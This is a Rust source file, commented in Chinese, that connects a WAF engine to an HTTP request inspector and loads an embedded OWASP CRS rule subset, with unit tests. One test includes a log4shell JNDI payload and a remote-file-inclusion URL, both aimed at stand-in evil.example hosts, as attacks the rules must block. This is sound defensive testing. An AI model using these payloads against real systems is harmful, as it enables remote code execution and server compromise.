//! 接线:rooster-waf 引擎 → http-guard `RequestInspector` 桥接。
//!
//! 规则集 = 内置签名 + CRS 子集(可选);构建产物与加载
//! 报告(不支持语法跳过明细)挂在 `AgentState.waf_report` 供面板展示。

use crate::httpguard::{InspectCtx, InspectVerdict, RequestInspector};
use rooster_config::EffectiveConfig;
use std::path::{Path, PathBuf};
use std::sync::RwLock;

/// 构建期内嵌的 CRS 规则子集(`build.rs` 从仓库 `rules/crs` 生成)。
mod crs_embedded {
    include!(concat!(env!("OUT_DIR"), "/crs_embedded.rs"));
}

/// 内嵌规则集落盘目录(相对 data-dir)。与 [`find_rules_dir`] 的三个候选
/// 路径不重叠,因此管理员自己放的规则目录永不被覆盖。
const EMBEDDED_SUBDIR: &str = "rules/crs-builtin";

pub struct WafInspector {
    rules: RwLock<rooster_waf::RuleSet>,
    /// 入站异常评分阈值。
    threshold: u32,
}

impl WafInspector {
    /// 按生效配置构建(阈值固定;规则集可经 `rebuild` 热更新)。
    pub fn new(eff: &EffectiveConfig, rules_dir: Option<&Path>) -> Self {
        let threshold = eff.waf.crs.inbound_anomaly_threshold.max(1);
        let (rules, report) = build_ruleset(eff, rules_dir);
        log_report(&report);
        WafInspector {
            rules: RwLock::new(rules),
            threshold,
        }
    }

    /// waf 配置变化后重建规则集;返回加载报告(JSON)。
    pub fn rebuild(&self, eff: &EffectiveConfig, rules_dir: Option<&Path>) -> serde_json::Value {
        let (rules, report) = build_ruleset(eff, rules_dir);
        log_report(&report);
        let json = report_to_json(&report, &rules, eff, rules_dir);
        *self.rules.write().unwrap() = rules;
        json
    }

    pub fn threshold(&self) -> u32 {
        self.threshold
    }

    /// 当前生效规则集的元数据清单(按 id 升序),供面板列出具体规则。
    pub fn rules_info(&self) -> Vec<rooster_waf::RuleInfo> {
        self.rules.read().unwrap().rules_info()
    }

    /// 当前 Paranoia Level(0 = 不过滤)。
    pub fn paranoia(&self) -> u8 {
        self.rules.read().unwrap().paranoia()
    }
}

impl RequestInspector for WafInspector {
    fn inspect(&self, ctx: InspectCtx<'_>) -> InspectVerdict {
        let req = rooster_waf::Request {
            method: ctx.method,
            uri: ctx.uri,
            headers: ctx.headers,
            cookies: ctx.cookies,
            body: ctx.body,
        };
        // 站点级排除由 http-guard 在命中列表上过滤,
        // 引擎侧统一用空排除表。
        let v = self
            .rules
            .read()
            .unwrap()
            .evaluate(&req, self.threshold, &[]);
        InspectVerdict {
            blocked: v.blocked,
            hits: v
                .hits
                .iter()
                .map(|h| (h.rule_id, h.msg.clone()))
                .collect(),
            // 严重度必须随判决透出,否则 Block 事件无法携带
            // severity,hub 联动策略(match.severity)永远不成立。
            hit_severities: v.hits.iter().map(|h| h.severity).collect(),
            score: v.score,
        }
    }
}

/// 解析 CRS 规则目录:优先 data-dir 旁挂载,其次安装前缀(管理员自备的规则集
/// 优先)。都没有且 CRS 已启用 → 落盘构建期内嵌的子集并用它,使节点在没有任何
/// 外部分发通道的情况下也能加载 CRS;失败 → None(只剩内置签名)。
pub fn find_rules_dir(eff: &EffectiveConfig, data_dir: &Path) -> Option<PathBuf> {
    let candidates = [
        data_dir.join("rules").join("crs"),
        PathBuf::from("/usr/share/rooster/rules/crs"),
        PathBuf::from("/etc/rooster/rules/crs"),
    ];
    for c in &candidates {
        if c.is_dir() {
            return Some(c.clone());
        }
    }
    if !eff.waf.crs.enabled {
        return None;
    }
    match materialize_embedded_crs(data_dir) {
        Some(dir) => {
            tracing::info!(
                dir = %dir.display(),
                files = crs_embedded::CRS_FILE_COUNT,
                "no local CRS rule set found; using the rule set embedded in this build"
            );
            Some(dir)
        }
        None => {
            tracing::warn!("waf.crs enabled but no rules directory found; CRS disabled");
            None
        }
    }
}

/// 把构建期内嵌的 CRS 写到 `<data-dir>/rules/crs-builtin`,返回该目录。
///
/// 指纹一致 → 直接复用(不抹掉管理员可能的本地修改);目录非空但无指纹 →
/// 视为管理员自备,同样不写;否则全量重写。写失败(只读挂载、权限)返回 None。
pub fn materialize_embedded_crs(data_dir: &Path) -> Option<PathBuf> {
    let dir = data_dir.join(EMBEDDED_SUBDIR);
    let marker = dir.join(".fingerprint");
    let want = crs_embedded::CRS_FINGERPRINT;
    match std::fs::read_to_string(&marker) {
        Ok(got) if got.trim() == want => return Some(dir),
        Ok(_) => {}
        Err(_) => {
            let occupied = std::fs::read_dir(&dir).map(|mut rd| rd.next().is_some()).unwrap_or(false);
            if occupied {
                tracing::warn!(dir = %dir.display(), "rule directory exists without a build fingerprint; leaving it untouched");
                return Some(dir);
            }
        }
    }
    if let Err(e) = std::fs::create_dir_all(&dir) {
        tracing::warn!(dir = %dir.display(), error = %e, "cannot create embedded CRS directory");
        return None;
    }
    for (name, bytes) in crs_embedded::CRS_FILES {
        if let Err(e) = std::fs::write(dir.join(name), bytes) {
            tracing::warn!(file = %name, error = %e, "cannot write embedded CRS rule file");
            return None;
        }
    }
    if let Err(e) = std::fs::write(&marker, want) {
        tracing::debug!(error = %e, "cannot write embedded CRS fingerprint marker");
    }
    Some(dir)
}

/// 读取目录下全部 `*.conf`(跳过 `.example`),按文件名排序拼接。
fn read_rules_source(dir: &Path) -> std::io::Result<String> {
    let mut files: Vec<PathBuf> = std::fs::read_dir(dir)?
        .filter_map(|e| e.ok())
        .map(|e| e.path())
        .filter(|p| {
            p.extension().map(|x| x == "conf").unwrap_or(false)
                && !p.to_string_lossy().ends_with(".conf.example")
        })
        .collect();
    files.sort();
    let mut source = String::new();
    for f in files {
        source.push_str(&std::fs::read_to_string(&f)?);
        source.push('\n');
    }
    Ok(source)
}

fn build_ruleset(
    eff: &EffectiveConfig,
    rules_dir: Option<&Path>,
) -> (rooster_waf::RuleSet, rooster_waf::LoadReport) {
    // 内置签名;空列表 = 全部。
    let (mut rules, mut report) = rooster_waf::RuleSet::load_builtin(&eff.waf.signatures);

    if eff.waf.crs.enabled {
        if let Some(dir) = rules_dir {
            match read_rules_source(dir) {
                Ok(source) => {
                    let (crs, crs_report) =
                        rooster_waf::RuleSet::load_seclang(&source, Some(dir));
                    let mut merged = crs_report;
                    let pl = eff.waf.crs.paranoia_level;
                    let mut crs = crs;
                    crs.set_paranoia(pl);
                    rules = rules.merge(crs);
                    report.loaded += merged.loaded;
                    report.skipped.append(&mut merged.skipped);
                }
                Err(e) => {
                    tracing::warn!("cannot read CRS rules at {}: {e}", dir.display());
                }
            }
        } else {
            tracing::warn!("waf.crs enabled but no rules directory found; CRS disabled");
        }
    }
    (rules, report)
}

fn log_report(report: &rooster_waf::LoadReport) {
    if report.skipped.is_empty() {
        tracing::info!(loaded = report.loaded, "waf rules loaded");
        return;
    }
    tracing::warn!(
        loaded = report.loaded,
        skipped = report.skipped.len(),
        "waf rules loaded (unsupported syntax skipped, see /v0/management/waf/report)"
    );
}

/// 加载报告 → 面板数据源。除 loaded/skipped 外,必须说清 CRS 到底从哪来、
/// 有没有生效:只有计数的报告会让“为什么只加载了 10 条”变成不可诊断的问题。
fn report_to_json(
    report: &rooster_waf::LoadReport,
    rules: &rooster_waf::RuleSet,
    eff: &EffectiveConfig,
    rules_dir: Option<&Path>,
) -> serde_json::Value {
    let embedded = rules_dir
        .map(|d| d.ends_with(EMBEDDED_SUBDIR))
        .unwrap_or(false);
    let source = match rules_dir {
        None => serde_json::Value::Null,
        Some(_) if embedded => serde_json::json!("builtin-embedded"),
        Some(_) => serde_json::json!("local-dir"),
    };
    // `skipped` 只列真正没加载上的规则(覆盖面损失);`directive:` 前缀的条目
    // 是不支持的辅助指令(SecMarker / SecRuleUpdateTargetById 等),按
    // LoadReport 的口径不进加载率分母,单独计数展示,否则面板会报“87 条规则
    // 被跳过”而实际上 0 条。
    let directives = report
        .skipped
        .iter()
        .filter(|s| s.reason.starts_with("directive:"))
        .collect::<Vec<_>>();
    let rule_skips = report
        .skipped
        .iter()
        .filter(|s| !s.reason.starts_with("directive:"))
        .collect::<Vec<_>>();
    let skip_entry = |s: &&rooster_waf::Skip| {
        serde_json::json!({ "line": s.line, "reason": s.reason })
    };
    serde_json::json!({
        "loaded": report.loaded,
        "skipped": rule_skips.iter().map(skip_entry).collect::<Vec<_>>(),
        "ignored_directives": directives.len(),
        "ignored_directive_details": directives.iter().map(skip_entry).collect::<Vec<_>>(),
        "paranoia_level": rules.paranoia(),
        "unmodelled_targets": rules.rules_with_unmodelled_targets().len(),
        "crs": {
            "enabled": eff.waf.crs.enabled,
            "configured_paranoia_level": eff.waf.crs.paranoia_level,
            "rules_present": rules_dir.is_some(),
            "source": source,
            "dir": rules_dir.map(|d| d.display().to_string()),
            "embedded_files": crs_embedded::CRS_FILE_COUNT,
        },
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use rooster_config::EffectiveConfig;

    fn eff(crs: bool) -> EffectiveConfig {
        let yaml = format!("waf:\n  crs:\n    enabled: {}\n    paranoia-level: 1\n", crs);
        serde_norway::from_str(&yaml).expect("test config parses")
    }

    fn tmpdir(tag: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("rooster-crs-{}-{}", tag, std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("tmp dir");
        dir
    }

    /// 靶场实测暴露的缺口:节点上没有本地规则集时 CRS 静默不加载,
    /// log4shell / RFI 这类只有 CRS 才覆盖的 payload 直接放行。
    /// 内嵌规则集必须让这条链路在无外部分发的节点上也成立。
    #[test]
    fn embedded_crs_loads_when_no_local_rules_present() {
        let dir = tmpdir("embedded");
        let e = eff(true);
        let rules_dir = find_rules_dir(&e, &dir).expect("embedded set materializes");
        assert!(rules_dir.ends_with(EMBEDDED_SUBDIR), "must be the embedded copy");
        let (rules, report) = build_ruleset(&e, Some(&rules_dir));
        assert!(
            report.loaded > 500,
            "CRS subset should load hundreds of rules, got {}",
            report.loaded
        );

        let headers: Vec<(String, String)> = vec![];
        for (label, uri) in [
            ("log4shell", "/?a=${jndi:ldap://evil.example/x}"),
            ("rfi", "/?page=http://evil.example.com/shell.php"),
        ] {
            let req = rooster_waf::Request {
                method: "GET",
                uri,
                headers: &headers,
                cookies: &headers,
                body: b"",
            };
            let v = rules.evaluate(&req, 5, &[]);
            assert!(v.blocked, "{label} must be blocked by the embedded CRS set");
        }
        std::fs::remove_dir_all(&dir).ok();
    }

    /// 管理员自备的规则目录优先,内嵌副本不得覆盖它(单一来源)。
    #[test]
    fn local_rules_dir_wins_over_embedded_copy() {
        let dir = tmpdir("local-first");
        let local = dir.join("rules").join("crs");
        std::fs::create_dir_all(&local).expect("local rules dir");
        std::fs::write(
            local.join("LOCAL-001.conf"),
            r#"SecRule REQUEST_URI "@rx localonly" "id:900001,phase:2,block,log,t:none,msg:'local rule',severity:CRITICAL,tag:'paranoia-level/1'"
"#,
        )
        .expect("write local rule");

        let e = eff(true);
        let got = find_rules_dir(&e, &dir).expect("local dir found");
        assert_eq!(got, local, "local rules dir must win");
        let (rules, report) = build_ruleset(&e, Some(&got));
        // 10 条内置签名 + 本地那 1 条;内嵌副本没参与。
        assert_eq!(report.loaded, 11, "local rule set must be the CRS source");
        assert_eq!(rules.rules_info().len(), 11);
        assert!(
            !dir.join(EMBEDDED_SUBDIR).exists(),
            "embedded copy must not be written when a local set exists"
        );
        std::fs::remove_dir_all(&dir).ok();
    }

    /// CRS 关闭时不应为了内嵌副本写盘(省一次无谓的 1 MB 落盘)。
    #[test]
    fn crs_disabled_writes_nothing() {
        let dir = tmpdir("crs-off");
        let e = eff(false);
        assert!(find_rules_dir(&e, &dir).is_none());
        assert!(!dir.join(EMBEDDED_SUBDIR).exists());
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn report_json_explains_where_crs_came_from() {
        let dir = tmpdir("report");
        let e = eff(true);
        let rules_dir = find_rules_dir(&e, &dir);
        let (rules, report) = build_ruleset(&e, rules_dir.as_deref());
        let json = report_to_json(&report, &rules, &e, rules_dir.as_deref());
        assert_eq!(json["crs"]["enabled"], serde_json::json!(true));
        assert_eq!(
            json["crs"]["source"],
            serde_json::json!("builtin-embedded"),
            "面板要能看出规则集来源: {json}"
        );
        assert!(json["crs"]["rules_present"].as_bool().unwrap_or(false));
        std::fs::remove_dir_all(&dir).ok();
    }
}
